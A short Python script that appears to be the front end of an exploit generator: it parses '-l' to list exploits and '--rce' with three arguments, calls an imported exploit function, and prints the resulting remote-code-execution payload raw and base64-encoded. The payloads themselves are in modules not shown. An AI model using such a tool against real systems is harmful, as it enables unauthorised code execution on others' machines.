import argparse
from config.show_option import *
from exploit.exp import *
from urllib import parse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('-l', nargs='?', type=int, const=1, help='show all exploits')
parser.add_argument('-r', '--rce', nargs='+', help='For RCE')
args = parser.parse_args()

List_all = args.l
Exploits = args.rce

if List_all:
    show()
elif Exploits:
    ret = exploit(Exploits[0], Exploits[1], Exploits[2])
    print("原生字符串：")
    print(ret)
    print("base64编码字符串：")
    print(base64.b64encode(ret.encode()).decode())


